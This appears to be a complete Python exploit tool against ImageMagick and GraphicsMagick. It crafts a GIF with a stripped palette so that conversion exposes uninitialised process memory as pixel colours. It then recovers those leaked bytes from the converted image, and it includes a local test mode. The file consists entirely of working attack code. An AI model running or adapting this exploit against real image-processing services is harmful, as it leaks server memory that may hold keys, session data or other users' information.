#!/usr/bin/env python
import subprocess
import random
import string
import argparse
import sys

if sys.version_info[0] == 3:
    BIN_STDIN = sys.stdin.buffer
    BIN_STDOUT = sys.stdout.buffer
else:
    BIN_STDIN = sys.stdin
    BIN_STDOUT = sys.stdout


def gen_picture(w, h, colors=256):
    square_size = 1
    while True:
        if (w // square_size) * (h // square_size) < colors:
            break
        square_size *= 2

    if square_size == 1:
        raise ValueError("picture size too small")

    square_size //= 2
    per_row = w // square_size
    per_column = h // square_size

    pict = []
    for i in range(per_column):
        line = []
        for j in range(per_row):
            color = (i * per_row + j) % colors
            line.extend([color] * square_size)
        line.extend([line[-1]] * (w - len(line)))
        pict.extend([line] * square_size)
    pict.extend([pict[-1]] * (h - len(pict)))
    return pict


def gen_gif_saving_palette():
    return [(i, i, i) for i in range(256)]


def gen_random_palette():
    palette = []
    for _ in range(256):
        palette.append(tuple(random.randint(0, 255) for _ in range(3)))
    return palette


def gen_testing_text_palette():
    text = """Lorem ipsum dolor sit amet, consectetur adipiscing elit,
sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut
enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi
ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit
in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur
sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt
mollit anim id est laborum.""" * 10
    palette = []
    for i in range(256):
        palette.append(tuple(map(ord, text[i*3:i*3+3])))
    return palette


def make_ppm(palette, picture):
    h = len(picture)
    assert h > 0
    w = len(picture[0])
    pict_data = bytearray("P6\n{} {}\n255\n".format(w, h).encode('utf8'))
    for r in picture:
        assert len(r) == w
        for v in r:
            pict_data.extend(palette[v])
    return bytes(pict_data)


def load_pixels(w, h, data):
    assert len(data) == w * h * 3
    pixels = []
    pos = 0
    for i in range(h):
        row = []
        for j in range(w):
            pix = []
            for c in range(3):
                pix.append(bytearray([data[(i * w + j) * 3 + c]])[0])
            row.append(tuple(pix))
        pixels.append(row)
    return pixels


def gen_dumping_gif(w, h, tool='GM', animate=False, colors=256):
    palette_size_log = 1
    while 2 ** palette_size_log < colors:
        palette_size_log += 1

    palette = gen_gif_saving_palette()[:2 ** palette_size_log]
    picture = gen_picture(w, h, colors=colors)
    ppm_data = make_ppm(palette, picture)
    assert tool in ('GM', 'IM')
    if tool == 'GM':
        prefix = ['gm']
    else:
        prefix = []

    command = prefix + ['convert', 'ppm:-']
    command.append('gif:-')
    convert = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    if animate:
        ppm_data *= 2   # generate second image (the same as first)
    stdout, stderr = convert.communicate(ppm_data)
    assert convert.returncode == 0, 'convert failed'
    palette_data = bytearray().join(map(bytearray, palette))
    gif_data = bytearray(stdout)
    assert gif_data[10] == 0xf0 | (palette_size_log - 1)
    gif_data[10] ^= 0x80
    comment = bytearray(b'!\xfe\x20')
    comment.extend(ord(random.choice(string.ascii_letters)) for _ in range(32))   # cache prevention
    comment.append(0)
    gif_data[13:13 + len(palette_data)] = comment
    return bytes(gif_data)


def load_picture(pict_data, tool='GM', picture_index=0):
    assert tool in ('GM', 'IM')
    if tool == 'GM':
        prefix = ['gm']
    else:
        prefix = []

    identify = subprocess.Popen(prefix + ['identify', '-format', '%w %h', '-[{}]'.format(picture_index)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    stdout, stderr = identify.communicate(pict_data)
    assert identify.returncode == 0, 'identify failed'
    w, h = map(int, stdout.decode('utf8').split())
    convert = subprocess.Popen(prefix + ['convert', '-[{}]'.format(picture_index), 'RGB:-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    stdout, stderr = convert.communicate(pict_data)
    assert convert.returncode == 0, 'convert failed'
    pixels = load_pixels(w, h, stdout)
    return pixels


def recover(pixels, colors=256):
    palette_options = [[] for _ in range(colors)]
    w = len(pixels[0])
    h = len(pixels)
    orig = gen_picture(w, h, colors)
    for x in range(h):
        for y in range(w):
                palette_options[orig[x][y]].append(pixels[x][y])

    palette = []
    for opts in palette_options:
        col = []
        if not opts:
            palette.append((None, None, None))
            continue
        cnts = {}
        for c in opts:
            cnts[c] = cnts.get(c, 0) + 1
        elected = max(cnts, key=cnts.get)
        col.extend(elected)
        palette.append(tuple(col))
    return palette


def test_recover(fmt, palette, w, h, quality=None, save_pict=None, tool='GM', colors=256):
    pict = gen_picture(w, h, colors=colors)
    ppm = make_ppm(palette, pict)
    assert tool in ('GM', 'IM')
    if tool == 'GM':
        prefix = ['gm']
    else:
        prefix = []

    assert all(x in string.digits + string.ascii_letters for x in fmt), "oi vey"

    if quality is None:
        quality = []
    else:
        quality = ['-quality', str(quality)]
    convert = subprocess.Popen(prefix + ['convert', '-'] + quality + [fmt + ':-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    stdout, stderr = convert.communicate(ppm)
    assert convert.returncode == 0, 'convert failed'
    pict_data = stdout
    if save_pict is not None:
        with open(save_pict, 'wb') as f:
            f.write(pict_data)
    pixels = load_picture(pict_data, tool)
    recovered_palette = recover(pixels, colors=colors)

    total = errors = 0
    for i in range(colors):
        for j in range(3):
            total += 1
            if palette[i][j] != recovered_palette[i][j]:
                errors += 1

    print('test completed, {} bytes total, {} recovered wrong ({:.2f}%)'.format(total, errors, errors * 100 / total))

def color_count(s):
    c = int(s)
    if not 0 < c <= 256:
        raise ValueError("color count must be between 1 and 256")
    return c

def geometry(geometry):
    try:
        w, h = map(int, geometry.split('x'))
    except:
        raise ValueError("Wrong geometry format: {}".format(geometry))
    return (w, h)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ImageMagick/GraphicsMagick uninitilized gif palette exploit")
    parser.add_argument('--tool', choices=['GM', 'IM'], default='IM', help='tool for internal conversion operations (default: IM)')

    subparsers = parser.add_subparsers(dest='cmd')
    subparsers.required = True
    gen_parser = subparsers.add_parser('gen', help='generate dumping gif')
    gen_parser.add_argument('--animate', help="try to generate fake animation", action="store_true")
    gen_parser.add_argument('geometry', help="geometry of the picture (WxH), must match converted picture geometry", type=geometry)
    gen_parser.add_argument('output_filename', help="where to save the result ('-' for stdout)", default='-', nargs='?')
    gen_parser.add_argument('--colors', type=color_count, help="dump less than 256 colors (will dump COLORS*3 bytes)", default=256)


    recover_parser = subparsers.add_parser('recover', help='recover memory from converted image')
    recover_parser.add_argument('input_filename', help='input file (\'-\' for stdin). geometry must match the original gif (generated via "gen" command). jpeg works very bad')
    recover_parser.add_argument('output_filename', default='-', help='where to save the result', nargs='?')
    recover_parser.add_argument('--colors', type=color_count, help="recover less than 256 colors (must be the value used when running \"gen\")", default=256)

    recover_test = subparsers.add_parser('recover_test', help='test recovery')
    recover_test.add_argument('geometry', help="geometry of the picture (WxH)", type=geometry)
    recover_test.add_argument('--format', help="format to test", default="png")
    recover_test.add_argument('--randomize', help="emulate random memory contents (default: use \"Lorem ipsum\" as memory contents)", action="store_true")
    recover_test.add_argument('--save-pict', help="save the picture")
    recover_test.add_argument('--quality', help="pass '--quality' to GM/IM call", default=None)
    recover_test.add_argument('--colors', type=color_count, help="dump less than 256 colors (will dump COLORS*3 bytes)", default=256)

    args = parser.parse_args()

    if args.cmd == 'gen':
        w, h = args.geometry
        gif = gen_dumping_gif(w, h, tool=args.tool, animate=args.animate, colors=args.colors)
        if args.output_filename == '-':
            BIN_STDOUT.write(gif)
        else:
            with open(args.output_filename, 'wb') as f:
                f.write(gif)

    elif args.cmd == 'recover':
        if args.input_filename == '-':
            pict_data = BIN_STDIN.read()
        else:
            with open(args.input_filename, 'rb') as f:
                pict_data = f.read()

        palette = recover(load_picture(pict_data, tool=args.tool), colors=args.colors)
        palette_bytes = bytes(bytearray().join(map(bytearray, palette)))

        if args.output_filename == '-':
            BIN_STDOUT.write(palette_bytes)
        else:
            with open(args.output_filename, 'wb') as f:
                f.write(palette_bytes)

    elif args.cmd == 'recover_test':
        w, h = args.geometry
        if args.randomize:
            palette = gen_random_palette()
        else:
            palette = gen_testing_text_palette()
        test_recover(args.format, palette, w, h, quality=args.quality, tool=args.tool, save_pict=args.save_pict, colors=args.colors)
